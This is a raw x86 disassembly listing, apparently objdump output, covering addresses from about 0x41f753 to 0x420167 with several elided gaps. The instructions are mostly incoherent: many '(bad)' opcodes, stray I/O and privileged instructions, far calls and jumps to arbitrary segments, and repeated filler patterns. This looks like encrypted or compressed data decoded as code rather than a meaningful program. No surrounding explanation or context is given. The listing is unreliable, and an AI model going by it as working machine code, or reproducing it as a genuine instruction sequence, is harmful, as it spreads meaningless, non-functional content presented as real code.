  41f753:	adc    edx,esp
  41f755:	into   
  41f756:	mov    eax,es
  41f758:	rcl    ah,1
  41f75a:	pop    edx
  41f75b:	cmp    BYTE PTR [edx-0x7c],dh
  41f75e:	add    BYTE PTR [esp+eax*8],ah
  41f761:	je     0x41f7d1
  41f763:	mov    esi,0x3512d527
  41f768:	and    al,0x78
  41f76a:	dec    esi
  41f76b:	jne    0x41f79a
  41f76d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
	...
  41f7d6:	xchg   edx,eax
  41f7d7:	cmp    al,0x23
  41f7d9:	jle    0x41f78a
  41f7db:	jg     0x41f7bc
  41f7dd:	cld    
  41f7de:	call   0xf4f6:0xda6c62d2
  41f7e5:	cwde   
  41f7e6:	addr16 push edx
  41f7e8:	add    DWORD PTR [eax],eax
  41f7ea:	add    BYTE PTR [ecx],al
  41f7ec:	add    BYTE PTR [eax],al
  41f7ee:	inc    edi
  41f7ef:	ss xor esi,edx
  41f7f2:	pusha  
  41f7f3:	dec    esi
  41f7f4:	lods   eax,DWORD PTR ds:[esi]
  41f7f5:	les    edi,FWORD PTR [ebx]
  41f7f7:	lds    edi,FWORD PTR [edx+ebx*8]
  41f7fa:	sbb    BYTE PTR [ebx+0x212f776],cl
  41f800:	mov    WORD PTR [edx-0x34],?
  41f803:	shl    BYTE PTR [eax],1
  41f805:	push   ds
  41f806:	push   0xee838cf7
  41f80b:	jb     0x41f79b
  41f80d:	adc    BYTE PTR es:[ecx-0x777ae283],0xdc
  41f815:	scas   eax,DWORD PTR es:[edi]
  41f816:	mov    DWORD PTR [ebx+ecx*4-0x2],ecx
  41f81a:	stos   BYTE PTR es:[edi],al
  41f81b:	jmp    0x41f852
  41f81d:	add    bh,dl
  41f81f:	icebp  
  41f820:	and    eax,0x25ff7b67
  41f825:	push   0x32b84c29
  41f82a:	mov    ds:0xa0260baa,al
  41f82f:	jmp    0x41f887
  41f831:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f832:	cdq    
  41f833:	sub    BYTE PTR [ebp-0x76f0f313],cl
  41f839:	mov    WORD PTR [ebp+0xd92219e],cs
  41f83f:	pop    edx
  41f840:	mov    WORD PTR [edi-0x5a],?
  41f843:	dec    edi
  41f844:	shl    bl,cl
  41f846:	and    BYTE PTR [ebp+0xb0fe52c],dh
  41f84c:	cwde   
  41f84d:	fdiv   DWORD PTR [edx+0x53ca3a9a]
  41f853:	push   ebx
  41f854:	push   0xc8ccb772
  41f859:	push   ebx
  41f85a:	sbb    eax,0x3c42b983
  41f85f:	leave  
  41f860:	mov    cl,0x91
  41f862:	(bad)  [ebx+0x29]
  41f865:	loop   0x41f84e
  41f867:	mov    DWORD PTR [esi+0x6f],esp
  41f86a:	out    0x2d,al
  41f86c:	mov    edi,0x319933af
  41f871:	rcr    BYTE PTR ds:0x2876784a,1
  41f877:	inc    eax
  41f878:	jae    0x41f88b
  41f87a:	add    bh,BYTE PTR [edi+0x7d]
  41f87d:	mov    esi,0x47a46fb3
  41f882:	stos   DWORD PTR es:[edi],eax
  41f883:	(bad)  
  41f884:	adc    BYTE PTR [ecx+ebp*8+0x2f],dh
  41f888:	retf   0x2663
  41f88b:	imul   ecx,DWORD PTR [edx+0x478f5793],0xe4463475
  41f895:	and    al,0xaf
  41f897:	jo     0x41f88a
  41f899:	sub    al,0x7c
  41f89b:	add    edx,edx
  41f89d:	add    DWORD PTR [ebp-0x551a2210],ebp
  41f8a3:	lds    ebp,FWORD PTR [ebx+0x1e]
  41f8a6:	ss sbb al,0x25
  41f8a9:	ss aad 0xc7
  41f8ac:	and    eax,0x54035ddf
  41f8b1:	div    DWORD PTR [edi+ebp*2]
  41f8b4:	sub    edx,DWORD PTR [esi]
  41f8b6:	inc    ecx
  41f8b7:	jg     0x41f8ac
  41f8b9:	into   
  41f8ba:	push   ebp
  41f8bb:	push   esp
  41f8bc:	sbb    dl,BYTE PTR [ebx+0x4aad20a8]
  41f8c2:	mov    ecx,0x38bb53c4
  41f8c7:	inc    edi
  41f8c8:	popa   
  41f8c9:	lds    esi,FWORD PTR [esi+0x59c8de8c]
  41f8cf:	in     eax,dx
  41f8d0:	sar    BYTE PTR [edi-0x29],cl
  41f8d3:	adc    eax,0x2b8ea6f8
  41f8d8:	mov    al,ds:0x419c59f8
  41f8dd:	(bad)  
  41f8de:	sub    dl,ch
  41f8e0:	leave  
  41f8e1:	cdq    
  41f8e2:	das    
  41f8e3:	or     al,0xe
  41f8e5:	xchg   ebp,eax
  41f8e6:	mov    esp,0xf2ffd3fb
  41f8eb:	push   0x30
  41f8ed:	call   0x0:0x0
	...
  41f954:	add    BYTE PTR [eax],al
  41f956:	mov    eax,ds:0x3b920b9a
  41f95b:	xchg   ebx,eax
  41f95c:	mov    ecx,0x4183febb
  41f961:	pop    edx
  41f962:	inc    esi
  41f963:	ficom  DWORD PTR [edx+ebp*4+0x67]
  41f967:	push   ebx
  41f968:	add    DWORD PTR [eax],eax
  41f96a:	add    BYTE PTR [ecx],al
  41f96c:	add    BYTE PTR [eax],al
  41f96e:	and    DWORD PTR [ebp-0x376e4514],ebp
  41f974:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f975:	in     eax,0x98
  41f977:	dec    ecx
  41f978:	or     eax,0x1269eafb
  41f97d:	jbe    0x41f9b2
  41f97f:	out    0xd5,al
  41f981:	add    eax,0x44af440a
  41f986:	jmp    0xa08f:0x588ac751
  41f98d:	push   ds
  41f98e:	dec    esp
  41f98f:	sbb    BYTE PTR [esi-0x56],al
  41f992:	fucomp st(4)
  41f994:	in     al,0x2a
  41f996:	add    eax,DWORD PTR [ebx+0x5ca11b48]
  41f99c:	ret    0xe62b
  41f99f:	(bad)  
  41f9a0:	std    
  41f9a1:	fucomip st,st(4)
  41f9a3:	sar    BYTE PTR [edi+0x66],cl
  41f9a6:	adc    bh,dl
  41f9a8:	loope  0x41f9e1
  41f9aa:	mov    cs,ebp
  41f9ac:	jno    0x41f9a6
  41f9ae:	cmp    BYTE PTR [ebx+eiz*1-0x42],dl
  41f9b2:	jb     0x41f9af
  41f9b4:	mov    ebx,0x437e7ff
  41f9b9:	mov    al,0x85
  41f9bb:	repnz fs cmp eax,0x69c2752b
  41f9c2:	fwait
  41f9c3:	ja     0x41f98e
  41f9c5:	div    DWORD PTR [edx]
  41f9c7:	inc    ebx
  41f9c8:	mov    ds:0x64e979c0,eax
  41f9cd:	out    dx,eax
  41f9ce:	(bad)  
  41f9cf:	mov    ?,ebx
  41f9d1:	or     ebp,DWORD PTR [eax]
  41f9d3:	pusha  
  41f9d4:	adc    al,0x6d
  41f9d6:	dec    ecx
  41f9d7:	xor    al,0xc
  41f9d9:	bound  ebp,QWORD PTR [edi+esi*4+0x193ef553]
  41f9e0:	push   0x9f0ccded
  41f9e5:	lahf   
  41f9e6:	adc    al,0x28
  41f9e8:	mov    WORD PTR [eax-0x36322510],?
  41f9ee:	dec    eax
  41f9ef:	inc    edx
  41f9f0:	(bad)  
  41f9f1:	aad    0x69
  41f9f3:	fstp   TBYTE PTR [edi+0x73]
  41f9f6:	pop    ebp
  41f9f7:	push   ecx
  41f9f8:	add    dl,cl
  41f9fa:	jbe    0x41f9bf
  41f9fc:	cs hlt 
  41f9fe:	xlat   BYTE PTR ds:[ebx]
  41f9ff:	ja     0x41fa7d
  41fa01:	(bad)  
  41fa02:	mov    cs,WORD PTR [ecx+0x21]
  41fa05:	adc    eax,DWORD PTR [esi]
  41fa07:	outs   dx,BYTE PTR ds:[esi]
  41fa08:	fld    QWORD PTR [edi-0x4e]
  41fa0b:	ds sub al,0x7d
  41fa0e:	cmp    eax,0xf4b7c24f
  41fa13:	mov    esi,esi
  41fa15:	mov    ds:0x93c95619,al
  41fa1a:	mov    ah,0xd6
  41fa1c:	pop    ecx
  41fa1d:	aam    0xf
  41fa1f:	or     ebp,ecx
  41fa21:	push   es
  41fa22:	test   BYTE PTR [edx+0x14edfa9e],0x8c
  41fa29:	mov    bl,0xa2
  41fa2b:	dec    edx
  41fa2c:	call   0xd0c8b551
  41fa31:	out    dx,al
  41fa32:	fbld   TBYTE PTR [esi]
  41fa34:	rol    DWORD PTR [esi-0x5e],0x16
  41fa38:	into   
  41fa39:	sti    
  41fa3a:	sub    al,dh
  41fa3c:	and    BYTE PTR [esi],0x90
  41fa3f:	xor    edx,DWORD PTR [eax-0x15]
  41fa42:	je     0x41faaa
  41fa44:	jp     0x41f9e6
  41fa46:	(bad)
  41fa49:	adc    bl,BYTE PTR [ebx]
  41fa4b:	and    BYTE PTR [ebx],al
  41fa4d:	je     0x41fa3c
  41fa4f:	pop    ecx
  41fa50:	shl    DWORD PTR [eax-0x29d1fcaa],0x40
  41fa57:	mov    bh,0xf0
  41fa59:	inc    ebp
  41fa5a:	pop    eax
  41fa5b:	pop    esp
  41fa5c:	fsub   DWORD PTR [ecx+0x36]
  41fa5f:	and    eax,0x19c3225e
  41fa64:	xor    BYTE PTR es:[edx+0x4b],dh
  41fa68:	sub    al,0x4d
  41fa6a:	inc    ebp
  41fa6b:	in     eax,dx
  41fa6c:	adc    BYTE PTR [esi+0x0],bl
	...
  41fad6:	or     al,BYTE PTR [ecx-0x49]
  41fad9:	mov    eax,ds:0xeb1ef7ff
  41fade:	and    edx,DWORD PTR [edi-0x5d]
  41fae1:	adc    eax,0x41b53db5
  41fae6:	addr16 push esp
  41fae8:	add    DWORD PTR [eax],eax
  41faea:	add    BYTE PTR [ecx],al
  41faec:	add    BYTE PTR [eax],al
  41faee:	inc    eax
  41faef:	inc    ebx
  41faf0:	aaa    
  41faf1:	scas   eax,DWORD PTR es:[edi]
  41faf2:	psadbw mm4,QWORD PTR [ecx+0x28]
  41faf6:	jmp    0x399c:0xe891aea5
  41fafd:	fadd   DWORD PTR [eax-0x37]
  41fb00:	arpl   WORD PTR [edx],sp
  41fb02:	lds    esp,FWORD PTR ds:[esi-0x1c7b9d2d]
  41fb09:	(bad)  
  41fb0a:	and    eax,0x953ca814
  41fb0f:	in     eax,0x4b
  41fb11:	call   0x16aa4d8f
  41fb16:	test   eax,0x29a5817f
  41fb1b:	lock mov esi,0x8fa818eb
  41fb21:	loop   0x41fb38
  41fb23:	ret    
  41fb24:	mov    esp,0x4ed84557
  41fb29:	in     eax,dx
  41fb2a:	shr    DWORD PTR [eax-0x612d58c8],1
  41fb30:	stos   BYTE PTR es:[edi],al
  41fb31:	mov    edx,0x95d48599
  41fb36:	push   ebp
  41fb37:	aas    
  41fb38:	mov    ebp,0x253cf4b4
  41fb3d:	push   ebp
  41fb3e:	xor    al,0x8f
  41fb40:	push   edx
  41fb41:	mov    eax,ds:0x419e6a0f
  41fb47:	hlt    
  41fb48:	out    0xe0,eax
  41fb4a:	push   es
  41fb4b:	mov    ?,eax
  41fb4d:	ja     0x41fb14
  41fb4f:	fcomp  QWORD PTR [eax]
  41fb51:	cs cli 
  41fb53:	push   ecx
  41fb54:	into   
  41fb55:	inc    edi
  41fb56:	sti    
  41fb57:	aam    0x30
  41fb59:	xchg   ebx,eax
  41fb5a:	cmc    
  41fb5b:	popf   
  41fb5c:	shl    BYTE PTR [eax],0xfd
  41fb5f:	fidiv  WORD PTR [edi+ebx*1]
  41fb62:	mov    eax,0xceed2a70
  41fb67:	pop    ecx
  41fb68:	pop    edi
  41fb69:	jno    0x41fb09
  41fb6b:	out    dx,al
  41fb6c:	push   ss
  41fb6d:	xor    esi,DWORD PTR [bx]
  41fb70:	jne    0x41fb20
  41fb72:	fcomp  st(7)
  41fb74:	std    
  41fb75:	xchg   ecx,eax
  41fb76:	push   ebp
  41fb77:	fisubr WORD PTR [edi-0x4a]
  41fb7a:	mov    ah,0x3a
  41fb7c:	test   al,0xf3
  41fb7e:	mov    edx,0x331c2674
  41fb83:	pop    esi
  41fb84:	dec    edi
  41fb85:	inc    edx
  41fb86:	jg     0x41fb1c
  41fb88:	mov    dl,0x62
  41fb8a:	je     0x41fb9d
  41fb8c:	lahf   
  41fb8d:	fdiv   QWORD PTR [ebp+0x2a123630]
  41fb93:	add    ebx,DWORD PTR [edx]
  41fb95:	in     eax,0x3d
  41fb97:	bound  ebx,QWORD PTR [ebx]
  41fb99:	cmc    
  41fb9a:	dec    ebp
  41fb9b:	jle    0x41fbe4
  41fb9d:	pop    esi
  41fb9e:	mov    ah,0x19
  41fba0:	cmc    
  41fba1:	inc    eax
  41fba2:	lods   al,BYTE PTR ds:[esi]
  41fba3:	push   ds
  41fba4:	outs   dx,BYTE PTR ds:[esi]
  41fba5:	enter  0xf5b9,0x3c
  41fba9:	mov    eax,0xce9115b0
  41fbae:	push   esi
  41fbaf:	inc    edx
  41fbb0:	mov    eax,ds:0xac8dac9c
  41fbb5:	shl    edx,1
  41fbb7:	data16 jno 0x41fb93
  41fbba:	push   esi
  41fbbb:	imul   ecx,DWORD PTR ds:0x57d55ecf,0x17
  41fbc2:	dec    eax
  41fbc3:	pop    ebx
  41fbc4:	ffree  st(6)
  41fbc6:	or     BYTE PTR [esi],bl
  41fbc8:	ins    BYTE PTR es:[edi],dx
  41fbc9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fbca:	sahf   
  41fbcb:	fistp  DWORD PTR [ecx+0x32]
  41fbce:	cmp    DWORD PTR [edx+ebp*4],ecx
  41fbd1:	mov    fs,ecx
  41fbd3:	rcr    DWORD PTR [ebp-0x47da2499],1
  41fbd9:	setns  BYTE PTR [esi-0x2]
  41fbdd:	and    ebx,DWORD PTR ds:0xab7cf5e0
  41fbe3:	add    ebp,esp
  41fbe5:	fwait
  41fbe6:	into   
  41fbe7:	lods   al,BYTE PTR ds:[esi]
  41fbe8:	ss dec ecx
  41fbea:	push   0x1daf65
	...
  41fc53:	add    BYTE PTR [eax],al
  41fc55:	add    ah,bl
  41fc57:	sub    BYTE PTR [edx-0x119011c],cl
  41fc5d:	cmp    BYTE PTR [esi],ah
  41fc5f:	ret    
  41fc60:	or     DWORD PTR [esi],edx
  41fc62:	fldenv [ecx]
  41fc64:	popf   
  41fc65:	nop
  41fc66:	addr16 push ebp
  41fc68:	add    DWORD PTR [eax],eax
  41fc6a:	add    BYTE PTR [ecx],al
  41fc6c:	add    BYTE PTR [eax],al
  41fc6e:	xchg   esi,eax
  41fc6f:	add    eax,0x90f7ca8a
  41fc74:	cmp    ebx,DWORD PTR ds:0xf2b20aa7
  41fc7a:	and    eax,0x8cefefe
  41fc7f:	dec    ecx
  41fc80:	push   ebx
  41fc81:	gs std 
  41fc83:	cs gs clc 
  41fc86:	xchg   ebx,eax
  41fc87:	jnp    0x41fd02
  41fc89:	add    dl,BYTE PTR [edx+ecx*2+0x7d]
  41fc8d:	in     eax,dx
  41fc8e:	jo     0x41fca4
  41fc90:	xor    BYTE PTR [ecx+esi*2],dh
  41fc93:	cmp    al,0x33
  41fc95:	push   edi
  41fc96:	sbb    eax,0x58955f7b
  41fc9b:	inc    ebx
  41fc9c:	jnp    0x41fd1b
  41fc9e:	inc    ebp
  41fc9f:	repnz fsubrp st(0),st
  41fca2:	sar    edx,cl
  41fca4:	cmp    al,0x9b
  41fca6:	fwait
  41fca7:	imul   esp,DWORD PTR [esi+0x65],0x43
  41fcab:	es stos DWORD PTR es:[edi],eax
  41fcad:	fdivr  DWORD PTR [ecx]
  41fcaf:	(bad)  
  41fcb0:	xor    DWORD PTR [edx],ebx
  41fcb2:	sbb    BYTE PTR [edi+0x4b],ah
  41fcb5:	lods   eax,DWORD PTR ds:[esi]
  41fcb6:	into   
  41fcb7:	add    BYTE PTR [edi-0x5],bh
  41fcba:	int    0x62
  41fcbc:	xor    ebx,DWORD PTR [ebp-0x51]
  41fcbf:	fist   WORD PTR [ebx]
  41fcc1:	hlt    
  41fcc2:	push   edi
  41fcc3:	pop    edx
  41fcc4:	pusha  
  41fcc5:	dec    esi
  41fcc6:	pop    ebp
  41fcc7:	mov    cl,0x84
  41fcc9:	retf   0x13a8
  41fccc:	pop    ecx
  41fccd:	xchg   bl,dl
  41fccf:	or     BYTE PTR [edx+ebx*4-0x71],bh
  41fcd3:	pusha  
  41fcd4:	pop    edx
  41fcd5:	shl    DWORD PTR [ecx+0x5e],cl
  41fcd8:	mov    al,BYTE PTR [esi-0x4d]
  41fcdb:	lea    esp,[edi+0xf]
  41fcde:	jle    0x41fd08
  41fce0:	and    esp,DWORD PTR [eax]
  41fce2:	popa   
  41fce3:	xor    al,0xf6
  41fce5:	and    al,0x34
  41fce7:	mov    ah,0xb5
  41fce9:	jb     0x41fd12
  41fceb:	push   ds
  41fcec:	retf   0x5a33
  41fcef:	(bad)  
  41fcf0:	(bad)  
  41fcf1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fcf2:	lea    edx,[ebx]
  41fcf4:	ret    
  41fcf5:	mov    edx,0xaef00cb3
  41fcfa:	xchg   esp,eax
  41fcfb:	and    ebp,DWORD PTR [edi+0x66e96ac0]
  41fd01:	jbe    0x41fd78
  41fd03:	mov    esp,0x66661228
  41fd08:	sbb    BYTE PTR [edx],dh
  41fd0a:	sbb    ebp,eax
  41fd0c:	cli    
  41fd0d:	mov    ds:0xce32d3a6,eax
  41fd12:	hlt    
  41fd13:	jb     0x41fd08
  41fd15:	dec    edx
  41fd16:	xchg   DWORD PTR [edx+0x25492be3],ecx
  41fd1c:	mov    ds:0x5b1ec086,eax
  41fd21:	lods   al,BYTE PTR ds:[esi]
  41fd22:	nop
  41fd23:	sti    
  41fd24:	dec    edi
  41fd25:	bnd call 0xd0d26ff2
  41fd2b:	cli    
  41fd2c:	cld    
  41fd2d:	mov    dh,BYTE PTR [esi]
  41fd2f:	imul   ecx,esi,0x683cdad8
  41fd35:	dec    esp
  41fd36:	add    ebx,DWORD PTR [esi+0x17]
  41fd39:	xlat   BYTE PTR ds:[ebx]
  41fd3a:	fst    QWORD PTR [eax+0x4ff6d7e0]
  41fd40:	nop
  41fd41:	outs   dx,BYTE PTR ds:[esi]
  41fd42:	xor    ax,0xe94c
  41fd46:	pop    esp
  41fd47:	mov    dx,0x5d34
  41fd4b:	sbb    eax,0xc8d85340
  41fd50:	(bad)  
  41fd52:	add    edx,ecx
  41fd54:	hlt    
  41fd55:	dec    ecx
  41fd56:	cmp    ebx,DWORD PTR [eax]
  41fd58:	push   es
  41fd59:	loope  0x41fdd7
  41fd5b:	popf   
  41fd5c:	or     eax,0x9248e4d
  41fd61:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  41fd63:	xor    dl,ah
  41fd65:	cmp    DWORD PTR [edi+0x3c3921c2],edi
  41fd6b:	ja     0x41fcee
  41fd6d:	cli    
	...
  41fdd6:	or     al,0x6a
  41fdd8:	push   edx
  41fdd9:	shl    DWORD PTR [esi-0x7],0x9f
  41fddd:	out    dx,eax
  41fdde:	pop    ds
  41fddf:	pop    edx
  41fde0:	pushf  
  41fde1:	push   ss
  41fde2:	retf   
  41fde3:	add    dl,BYTE PTR [ebx+0x47]
  41fde6:	addr16 push esi
  41fde8:	add    DWORD PTR [eax],eax
  41fdea:	add    BYTE PTR [ecx],al
  41fdec:	add    BYTE PTR [eax],al
  41fdee:	jp     0x41fe33
  41fdf0:	jmp    0x51283557
  41fdf5:	out    0xfc,eax
  41fdf7:	add    BYTE PTR [edx],0xaa
  41fdfa:	sub    al,0x39
  41fdfc:	in     eax,dx
  41fdfd:	inc    ebx
  41fdfe:	retf   
  41fdff:	adc    al,0xfc
  41fe01:	cmp    ah,BYTE PTR [eax+0x1d8eed8b]
  41fe07:	mov    esp,0x5abeaa10
  41fe0c:	icebp  
  41fe0d:	in     al,0xb3
  41fe0f:	xor    esi,DWORD PTR [edi-0x74cf33b1]
  41fe15:	pop    edx
  41fe16:	adc    DWORD PTR [eax-0x11459b79],0xffffffb0
  41fe1d:	stos   BYTE PTR es:[edi],al
  41fe1e:	rol    BYTE PTR [eax-0x1beb5a08],1
  41fe24:	les    ecx,FWORD PTR [ebp-0x30]
  41fe27:	or     ebp,DWORD PTR [ecx+0x62]
  41fe2a:	fisttp DWORD PTR [ebx-0x6f]
  41fe2d:	mov    ch,0xc3
  41fe2f:	pusha  
  41fe30:	xchg   ebx,eax
  41fe31:	dec    esp
  41fe32:	retf   
  41fe33:	sbb    DWORD PTR [eax],0x41
  41fe36:	mov    ebx,fs
  41fe38:	xor    BYTE PTR [eax],al
  41fe3a:	sti    
  41fe3b:	xchg   edi,eax
  41fe3c:	adc    dl,al
  41fe3e:	stos   DWORD PTR es:[edi],eax
  41fe3f:	xor    DWORD PTR [esi-0x47],ebx
  41fe42:	popf   
  41fe43:	out    0xc2,al
  41fe45:	cli    
  41fe46:	cmp    dh,BYTE PTR [ecx-0x38]
  41fe49:	mov    edi,0xc613e0c2
  41fe4e:	aam    0x7e
  41fe50:	jmp    0xb4f9:0xe2b7e4c7
  41fe57:	shl    edx,cl
  41fe59:	mov    ebx,DWORD PTR [ebx+0x5bae0477]
  41fe5f:	js     0x41fec8
  41fe61:	sub    ecx,edi
  41fe63:	dec    eax
  41fe64:	push   cs
  41fe65:	jmp    0x206a7d44
  41fe6a:	mov    cl,0x1e
  41fe6c:	xchg   edx,eax
  41fe6d:	mov    eax,0xe3ffe9c7
  41fe72:	std    
  41fe73:	add    ch,BYTE PTR [ebx]
  41fe75:	mov    esi,0x2468dd46
  41fe7a:	icebp  
  41fe7b:	sbb    esi,ecx
  41fe7d:	stos   BYTE PTR es:[edi],al
  41fe7e:	cmp    ecx,DWORD PTR [esi+esi*4+0x466fb317]
  41fe85:	mov    dl,0x84
  41fe87:	xchg   ecx,eax
  41fe88:	mov    ds:0x406897aa,eax
  41fe8d:	nop
  41fe8e:	mov    dh,0x93
  41fe90:	xchg   ebp,eax
  41fe91:	aam    0x49
  41fe93:	adc    BYTE PTR [eax+0x2cb72f3c],ch
  41fe99:	inc    ebp
  41fe9a:	push   ss
  41fe9b:	scas   al,BYTE PTR es:[edi]
  41fe9c:	ds in  eax,0xa0
  41fe9f:	mov    eax,ds:0x4cdc3879
  41fea4:	xor    DWORD PTR [edx+esi*2],esi
  41fea7:	and    bl,BYTE PTR [edi]
  41fea9:	sbb    al,0x8b
  41feab:	push   es
  41feac:	jno    0x41fe4b
  41feae:	fs inc esi
  41feb0:	test   BYTE PTR [eax-0x49dec4aa],al
  41feb6:	xchg   esi,eax
  41feb7:	sub    DWORD PTR [edx+ebp*8],0x6643ff30
  41febe:	iret   
  41febf:	sbb    al,ah
  41fec1:	stos   DWORD PTR es:[edi],eax
  41fec2:	add    bh,BYTE PTR [esi+ebp*8]
  41fec5:	adc    eax,0x9fd5985a
  41feca:	pop    eax
  41fecb:	jmp    0x41fe79
  41fecd:	dec    ecx
  41fece:	jmp    0x41fea2
  41fed0:	sub    BYTE PTR [ebx+0x4f],cl
  41fed3:	cmp    DWORD PTR [edi],esp
  41fed5:	pop    edi
  41fed6:	fucom  st(2)
  41fed8:	and    ch,BYTE PTR [ecx-0x5]
  41fedb:	push   0x351be372
  41fee0:	adc    BYTE PTR [edx-0x71],0x81
  41fee4:	daa    
  41fee5:	out    dx,al
  41fee6:	or     ebp,DWORD PTR [eax-0x2a]
  41fee9:	mov    edi,0x34602cae
	...
  41ff56:	stos   BYTE PTR es:[edi],al
  41ff57:	push   ebp
  41ff58:	call   0xfb5d:0xffefffe7
  41ff5f:	(bad)  
  41ff60:	hlt    
  41ff61:	mov    ah,0x90
  41ff63:	popfw  
  41ff65:	xor    al,0x67
  41ff67:	push   edi
  41ff68:	add    DWORD PTR [eax],eax
  41ff6a:	add    BYTE PTR [ecx],al
  41ff6c:	add    BYTE PTR [eax],al
  41ff6e:	(bad)  
  41ff70:	mov    ?,WORD PTR [ebx]
  41ff72:	mov    ds:0x261a578c,al
  41ff77:	ds dec esi
  41ff79:	xchg   DWORD PTR [edi],esp
  41ff7b:	jl     0x41ff8d
  41ff7d:	dec    ecx
  41ff7e:	scas   eax,DWORD PTR es:[edi]
  41ff7f:	aam    0xc0
  41ff81:	fisttp DWORD PTR [edx]
  41ff83:	mov    eax,DWORD PTR [edi-0x54defef7]
  41ff89:	add    al,0x4e
  41ff8b:	gs push ecx
  41ff8d:	fldcw  WORD PTR [eax]
  41ff8f:	hlt    
  41ff90:	mov    ds:0xe43ef715,eax
  41ff95:	mov    esp,0x6aa63c77
  41ff9a:	or     DWORD PTR [ebx+edx*1+0x5d],0x24
  41ff9f:	add    al,0x70
  41ffa1:	mov    esp,0x6cf549d1
  41ffa6:	dec    eax
  41ffa7:	add    al,0x48
  41ffa9:	int    0xab
  41ffab:	sub    al,0x22
  41ffad:	shl    DWORD PTR [esp+eiz*4],cl
  41ffb0:	retf   0xdcd0
  41ffb3:	popf   
  41ffb4:	and    ebp,DWORD PTR [edx+0x45]
  41ffb7:	push   esp
  41ffb8:	or     eax,0x68f71d09
  41ffbd:	(bad)  
  41ffbe:	stc    
  41ffbf:	mov    ah,0xe4
  41ffc1:	aam    0x19
  41ffc3:	pop    ss
  41ffc4:	inc    esp
  41ffc5:	mov    ah,0x22
  41ffc7:	sahf   
  41ffc8:	int    0x15
  41ffca:	mov    esp,0x98a5f815
  41ffd0:	icebp  
  41ffd1:	pop    es
  41ffd2:	and    dh,dh
  41ffd4:	adc    bl,BYTE PTR [edi+0x4d907062]
  41ffda:	outs   dx,BYTE PTR ds:[esi]
  41ffdb:	cwde   
  41ffdc:	xchg   BYTE PTR [eax+ecx*8+0x20],dh
  41ffe0:	jae    0x41ffe4
  41ffe2:	jg     0x41ffea
  41ffe4:	jecxz  0x420055
  41ffe6:	in     eax,0x4c
  41ffe8:	std    
  41ffe9:	mov    BYTE PTR [edi-0x4f],bh
  41ffec:	push   eax
  41ffed:	aaa    
  41ffee:	lock sbb eax,DWORD PTR [edi-0x5f]
  41fff2:	sub    bl,dl
  41fff4:	ins    DWORD PTR es:[edi],dx
  41fff5:	sbb    ebp,DWORD PTR [ebx]
  41fff7:	push   eax
  41fff8:	or     dh,BYTE PTR [esi]
  41fffa:	push   edi
  41fffb:	sbb    al,BYTE PTR [eax+ebp*8-0x75cd4a4]
  420002:	inc    esp
  420003:	jp     0x420036
  420005:	outs   dx,DWORD PTR ds:[esi]
  420006:	ds dec esp
  420008:	pop    ecx
  420009:	nop
  42000a:	cmp    DWORD PTR [ecx],esi
  42000c:	or     al,0xc3
  42000e:	jle    0x420037
  420010:	add    al,0x84
  420012:	mov    esi,0x626829a9
  420017:	mov    ah,0x70
  420019:	scas   al,BYTE PTR es:[edi]
  42001a:	sbb    BYTE PTR [ebp-0x2e],0x59
  42001e:	clc    
  42001f:	pop    eax
  420020:	out    dx,al
  420021:	inc    ebp
  420022:	hlt    
  420023:	dec    esi
  420024:	adc    DWORD PTR [eax-0x69eed12f],ebx
  42002a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42002b:	aaa    
  42002c:	into   
  42002d:	xchg   BYTE PTR [esi+ecx*8+0x1007f37c],dl
  420034:	mov    eax,0x694ac004
  420039:	and    al,0x22
  42003b:	inc    eax
  42003c:	hlt    
  42003d:	in     al,0x3
  42003f:	mov    ds:0xb8160df2,eax
  420044:	pop    ds
  420045:	jb     0x420091
  420047:	sub    eax,0xc7e3159e
  42004c:	cmp    eax,0x395375cc
  420051:	ja     0x420044
  420053:	bswap  ebp
  420055:	jmp    0xe0d05045
  42005a:	out    0x41,eax
  42005c:	push   0xffffffc6
  42005e:	jg     0x420048
  420060:	add    al,0x6a
  420062:	icebp  
  420063:	imul   esp,DWORD PTR [ebx],0xab9c0d53
  420069:	jecxz  0x42007e
  42006b:	pop    edi
  42006c:	sub    BYTE PTR [eax+eax*1],dh
	...
  4200d3:	add    BYTE PTR [eax],al
  4200d5:	add    BYTE PTR [edx-0x5b],ah
  4200d8:	jbe    0x420159
  4200da:	idiv   edi
  4200dc:	imul   edi,DWORD PTR [ebp-0x6d81eb08],0xffffff9b
  4200e3:	retf   
  4200e4:	pusha  
  4200e5:	jp     0x42014e
  4200e7:	pop    eax
  4200e8:	add    DWORD PTR [eax],eax
  4200ea:	add    BYTE PTR [ecx],al
  4200ec:	add    BYTE PTR [eax],al
  4200ee:	gs bnd jns 0x42014e
  4200f2:	xor    eax,0x1ae14946
  4200f7:	mov    DWORD PTR [ebp+0x509d62a],esp
  4200fd:	hlt    
  4200fe:	ret    0x8272
  420101:	sbb    DWORD PTR [eax],0xffffffd3
  420104:	and    ebp,DWORD PTR [edi]
  420106:	ins    BYTE PTR es:[edi],dx
  420107:	adc    DWORD PTR [esp+edx*4-0x79],esi
  42010b:	cmp    eax,0x3f644457
  420110:	jno    0x420100
  420112:	fnstcw WORD PTR [edi-0x1d]
  420115:	stos   DWORD PTR es:[edi],eax
  420116:	mov    WORD PTR [edi+ebx*1],ss
  420119:	retf   
  42011a:	mov    al,0x95
  42011c:	repz aad 0xda
  42011f:	jmp    0x1569:0xdfa05d3a
  420126:	cmovo  di,WORD PTR [ecx+edx*2-0x40]
  42012c:	arpl   WORD PTR [edx],si
  42012e:	cmp    al,0xc3
  420130:	and    edi,ecx
  420132:	sti    
  420133:	call   0x13d0:0xbaeba649
  42013a:	fcom   DWORD PTR [edx-0x73]
  42013d:	xchg   edi,eax
  42013e:	loope  0x4200f2
  420140:	mov    ah,0xe6
  420142:	js     0x42012b
  420144:	enter  0x8c24,0xf9
  420148:	call   0x8726c30
  42014d:	pop    ds
  42014e:	cmp    al,0x22
  420150:	imul   ecx,DWORD PTR [edx],0xffffffe2
  420153:	pop    ss
  420154:	jns    0x420138
  420156:	stc    
  420157:	pusha  
  420158:	or     BYTE PTR [ecx-0x58d4368a],dh
  42015e:	push   edi
  42015f:	adc    DWORD PTR [edi+0x3401a227],eax
  420165:	push   cs
  420166:	popf   
  420167:	in     eax,0x9
